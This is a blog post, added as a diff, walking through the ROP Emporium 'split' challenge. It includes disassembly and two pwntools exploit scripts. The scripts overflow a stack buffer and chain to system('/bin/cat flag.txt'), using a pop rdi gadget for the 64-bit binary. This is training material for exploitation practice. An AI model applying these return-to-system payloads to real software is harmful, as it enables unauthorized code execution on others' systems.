@@ -1,0 +1,251 @@
+---
+layout: post
+title:  "ROP Emporium: split"
+date:   2021-03-08 22:07:56 +0200
+categories: ropemporium
+---
+
+## 32-bit ##
+Similarly to the previous level's binary, we are prompted for input.
+```
+voidwalker@Abyss:[splitx86]** ./split32
+split by ROP Emporium
+x86
+
+Contriving a reason to ask user for data...
+> lol
+Thank you!
+
+Exiting
+```
+
+What is more, we can see that there is a buffer overflow at offset 44:
+```
+ 080485ad <pwnme>:
+ 80485ad:       55                      push   ebp
+ 80485ae:       89 e5                   mov    ebp,esp
+ 80485b0:       83 ec 28                sub    esp,0x28
+ 80485b3:       83 ec 04                sub    esp,0x4
+ 80485b6:       6a 20                   push   0x20
+ 80485b8:       6a 00                   push   0x0
+ 80485ba:       8d 45 d8                lea    eax,[ebp-0x28]
+ 80485bd:       50                      push   eax
+ 80485be:       e8 4d fe ff ff          call   8048410 <memset@plt>
+ 80485c3:       83 c4 10                add    esp,0x10
+ 80485c6:       83 ec 0c                sub    esp,0xc
+ 80485c9:       68 d4 86 04 08          push   0x80486d4
+ 80485ce:       e8 fd fd ff ff          call   80483d0 <puts@plt>
+ 80485d3:       83 c4 10                add    esp,0x10
+ 80485d6:       83 ec 0c                sub    esp,0xc
+ 80485d9:       68 00 87 04 08          push   0x8048700
+ 80485de:       e8 dd fd ff ff          call   80483c0 <printf@plt>
+ 80485e3:       83 c4 10                add    esp,0x10
+ 80485e6:       83 ec 04                sub    esp,0x4
+ 80485e9:       6a 60                   push   0x60
+ 80485eb:       8d 45 d8                lea    eax,[ebp-0x28]
+ 80485ee:       50                      push   eax
+ 80485ef:       6a 00                   push   0x0
+ 80485f1:       e8 ba fd ff ff          call   80483b0 <read@plt>
+ 80485f6:       83 c4 10                add    esp,0x10
+ 80485f9:       83 ec 0c                sub    esp,0xc
+ 80485fc:       68 03 87 04 08          push   0x8048703
+ 8048601:       e8 ca fd ff ff          call   80483d0 <puts@plt>
+ 8048606:       83 c4 10                add    esp,0x10
+ 8048609:       90                      nop
+ 804860a:       c9                      leave
+ 804860b:       c3                      ret
+```
+
+Luckily, we are also given a ```usefulFnction``` that gives out the address of ```system``` entry in the ```PLT``` table.
+```
+ 0804860c <usefulFunction>:
+ 804860c:       55                      push   ebp
+ 804860d:       89 e5                   mov    ebp,esp
+ 804860f:       83 ec 08                sub    esp,0x8
+ 8048612:       83 ec 0c                sub    esp,0xc
+ 8048615:       68 0e 87 04 08          push   0x804870e
+ 804861a:       e8 c1 fd ff ff          call   80483e0 <system@plt>
+ 804861f:       83 c4 10                add    esp,0x10
+ 8048622:       90                      nop
+ 8048623:       c9                      leave
+ 8048624:       c3                      ret
+ 8048625:       66 90                   xchg   ax,ax
+ 8048627:       66 90                   xchg   ax,ax
+ 8048629:       66 90                   xchg   ax,ax
+ 804862b:       66 90                   xchg   ax,ax
+ 804862d:       66 90                   xchg   ax,ax
+ 804862f:       90                      nop
+```
+All we need to do now is find the address of a useful parameter to pass to ```system```, which, luckily, is static, since ```PIE``` is disabled.
+```
+voidwalker@Abyss:[splitx86]** checksec ./split32
+[*] '/home/voidwalker/ROPEmporium/splitx86/split32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+```
+voidwalker@Abyss:[splitx86]** readelf -x .data split32
+
+Hex dump of section '.data':
+  0x0804a028 00000000 00000000 2f62696e 2f636174 ......../bin/cat
+  0x0804a038 20666c61 672e7478 7400               flag.txt.
+```
+
+Alright, now we have ```/bin/cat flag.txt``` and the address of ```system``` in ```PLT``` so let's write our final exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "i386"
+context.bits = 32
+context.endian = "little"
+
+e = ELF("./split32")
+
+io = e.process()
+
+print(io.recvuntil('>'))
+
+payload = b"A" * 44
+payload += p32(0x80483e0) # system()
+payload += b"JUNK"
+payload += p32(0x804a030) # /bin/cat flag.txt
+
+with open('payload', 'wb') as file:
+    file.write(payload)
+
+io.sendline(payload)
+
+print(io.recvrepeat())
+```
+
+And here's our flag:
+
+```
+voidwalker@Abyss:[splitx86]** ./exploit.py
+[*] '/home/voidwalker/ROPEmporium/splitx86/split32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process '/home/voidwalker/ROPEmporium/splitx86/split32': pid 6101
+b'split by ROP Emporium\nx86\n\nContriving a reason to ask user for data...\n>'
+b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+```
+
+## 64-bit ##
+The same steps can be followed for this binary.
+```
+00000000004006e8 <pwnme>:
+  4006e8:       55                      push   rbp
+  4006e9:       48 89 e5                mov    rbp,rsp
+  4006ec:       48 83 ec 20             sub    rsp,0x20
+  4006f0:       48 8d 45 e0             lea    rax,[rbp-0x20]
+  4006f4:       ba 20 00 00 00          mov    edx,0x20
+  4006f9:       be 00 00 00 00          mov    esi,0x0
+  4006fe:       48 89 c7                mov    rdi,rax
+  400701:       e8 7a fe ff ff          call   400580 <memset@plt>
+  400706:       bf 10 08 40 00          mov    edi,0x400810
+  40070b:       e8 40 fe ff ff          call   400550 <puts@plt>
+  400710:       bf 3c 08 40 00          mov    edi,0x40083c
+  400715:       b8 00 00 00 00          mov    eax,0x0
+  40071a:       e8 51 fe ff ff          call   400570 <printf@plt>
+  40071f:       48 8d 45 e0             lea    rax,[rbp-0x20]
+  400723:       ba 60 00 00 00          mov    edx,0x60
+  400728:       48 89 c6                mov    rsi,rax
+  40072b:       bf 00 00 00 00          mov    edi,0x0
+  400730:       e8 5b fe ff ff          call   400590 <read@plt>
+  400735:       bf 3f 08 40 00          mov    edi,0x40083f
+  40073a:       e8 11 fe ff ff          call   400550 <puts@plt>
+  40073f:       90                      nop
+  400740:       c9                      leave
+  400741:       c3                      ret
+
+0000000000400742 <usefulFunction>:
+  400742:       55                      push   rbp
+  400743:       48 89 e5                mov    rbp,rsp
+  400746:       bf 4a 08 40 00          mov    edi,0x40084a
+  40074b:       e8 10 fe ff ff          call   400560 <system@plt>
+  400750:       90                      nop
+  400751:       5d                      pop    rbp
+  400752:       c3                      ret
+  400753:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
+  40075a:       00 00 00
+  40075d:       0f 1f 00                nop    DWORD PTR [rax]
+```
+The mitigations are the same
+```
+voidwalker@Abyss:[splitx64]** checksec ./split
+[*] '/home/voidwalker/ROPEmporium/splitx64/split'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+The useful string is still there, just at a different address
+```
+voidwalker@Abyss:[splitx64]** readelf -x .data split
+
+Hex dump of section '.data':
+  0x00601050 00000000 00000000 00000000 00000000 ................
+  0x00601060 2f62696e 2f636174 20666c61 672e7478 /bin/cat flag.tx
+  0x00601070 7400
+```
+
+However, since this is a ```64-bit``` binary, we need to respect the ```fastcall``` calling convention of Linux and pass the string through the ```rdi``` register, which always takes the first argument to any function.
+Luckily, we can easily find a ```pop rdi``` ROPgadget```.
+```
+voidwalker@Abyss:[splitx64]** ROPgadget --binary split | grep "pop rdi"
+0x00000000004007c3 : pop rdi ; ret
+```
+
+Now we can finally write our exploit script and get our flag
+
+```python
+voidwalker@Abyss:[splitx64]** cat exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "amd64"
+context.bits = 64
+context.endian = "little"
+
+e = ELF("./split")
+
+io = e.process()
+
+print(io.recvuntil('>'))
+
+payload = b"A" * 40
+payload += p64(0x4007c3) # pop rdi
+payload += p64(0x601060) # /bin/cat flag.txt
+payload += p64(0x400560) # system()
+
+with open('payload', 'wb') as file:
+    file.write(payload)
+
+io.sendline(payload)
+
+print(io.recvrepeat())
+```
+```
+voidwalker@Abyss:[splitx64]** ./exploit.py
+[*] '/home/voidwalker/ROPEmporium/splitx64/split'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/home/voidwalker/ROPEmporium/splitx64/split': pid 6966
+b'split by ROP Emporium\nx86_64\n\nContriving a reason to ask user for data...\n>'
+b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+```
+
